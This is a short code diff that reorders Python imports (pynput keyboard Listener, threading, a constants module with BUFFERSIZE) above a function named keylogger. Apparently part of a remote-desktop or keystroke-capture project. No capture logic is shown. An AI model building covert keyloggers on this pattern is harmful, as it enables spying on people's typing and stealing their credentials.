@@ -1,8 +1,7 @@
 import threading
-
 import keyboard
-from RD_Constant import BUFFERSIZE, FORMAT
 from pynput.keyboard import Listener
+from RD_Constant import BUFFERSIZE, FORMAT
 
 
 def keylogger(key):
